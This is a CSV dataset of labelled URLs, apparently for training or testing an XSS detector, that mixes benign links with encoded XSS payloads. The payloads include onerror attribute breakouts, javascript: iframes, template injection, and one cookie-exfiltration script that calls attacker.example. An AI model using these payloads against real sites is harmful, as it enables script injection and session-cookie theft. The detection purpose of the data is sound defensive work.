url,payload,carrier,param_name,encoded,notes,label
https://mysite.example/redirect?url=https://victim.example/?p=news,news,redirect,id,raw,benign,0
https://vulnerable.app/page#&quot;&gt;&lt;img src=x onerror=alert(1)&gt;,"""><img src=x onerror=alert(1)>",fragment,,html_entity,attribute_breakout_img,1
https://portal.example.net/search?input=article,article,query,input,raw,benign,0
https://catalog.example/search?redirect=prices&lang=google,prices,query,redirect,raw,benign,0
"https://webapp.local/search?query=""><video><source onerror=alert(1)></video>","""><video><source onerror=alert(1)></video>",query,query,raw,attribute_breakout_video,1
"https://demo.example.org/search?url=""><video><source onerror=alert(1)></video>","""><video><source onerror=alert(1)></video>",query,url,raw,attribute_breakout_video,1
https://mysite.example/user/signup35789/profile,signup35789,path,,raw,benign,0
https://blog.example/search?query=welcome&lang=en,welcome,query,query,raw,benign,0
https://testsite.local/search?callback=2025-10-01,2025-10-01,query,callback,raw,benign,0
https://webapp.local/search?search=contact&source=organic,contact,query,search,raw,benign,0
https://service.test/user/%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E/profile,<iframe src='javascript:alert(1)'></iframe>,path,,urlencoded,iframe_js_uri,1
https://catalog.example/user/signup/profile,signup,path,,raw,benign,0
https://service.test/user/article/profile,article,path,,raw,benign,0
https://blog.example/search?session=product2338,product2338,query,session,raw,benign,0
https://shop.example/search?file=contact&utm_source=google,contact,query,file,raw,benign,0
https://demo.example.org/search?search=%257B%257Bconstructor.constructor%2528%2527alert%25281%2529%2527%2529%2528%2529%257D%257D&page=newsletter,{{constructor.constructor('alert(1)')()}},query,search,double_urlencoded,template_injection,1
https://vulnerable.app/api?callback=&#x27;);document.location=&#x27;javascript:alert(1)&#x27;//&id=1&session=newsletter,');document.location='javascript:alert(1)'//,callback,callback,html_entity,document_location_js,1
https://portaL.example.Net/api?callback=<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>&id=1,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,callback,callback,raw,cookie_exfil,1
https://example.com/user/%3Ciframe+src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E/profile,<iframe src='javascript:alert(1)'></iframe>,path,,mixed,iframe_js_uri,1
https://webapp.local/redirect?url=https://victim.example/?p=article,article,redirect,query,raw,benign,0
https://mysite.example/search?query=welcome66527,welcome66527,query,query,raw,benign,0
https://shop.example/search?file=en,en,query,file,raw,benign,0
